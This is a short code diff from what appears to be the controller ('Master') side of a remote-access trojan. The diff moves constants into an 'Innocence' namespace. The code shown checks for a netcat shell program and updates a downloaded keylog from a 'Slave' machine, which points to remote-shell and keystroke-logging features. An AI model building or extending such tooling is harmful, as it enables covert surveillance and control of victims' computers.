@@ -9,7 +9,7 @@ using namespace std;
 #include "Slave.hpp"
 #include <common/Log.hpp>
 #include <system/File.hpp>
-#include <blaspheme/Blaspheme.hpp>
+#include <Innocence.hpp>
 using namespace Blaspheme;
 
 namespace Master
@@ -195,7 +195,7 @@ namespace Master
         try
         {
             // on verifie si netcat existe :
-            ifstream netcat(SHELL_PROGRAM, std::ios::binary);
+            ifstream netcat(Innocence::SHELL_PROGRAM, std::ios::binary);
             if(!netcat)
             {
                 LOG << "NetCat program does not exist";
@@ -421,7 +421,7 @@ namespace Master
 
     void Slave::updateKeylog(QProgressBar * bar)
     {
-        remove(LOG_PATH_DOWNLOAD);
+        remove(Innocence::LOG_PATH_DOWNLOAD);
         try
         {
             string answer;
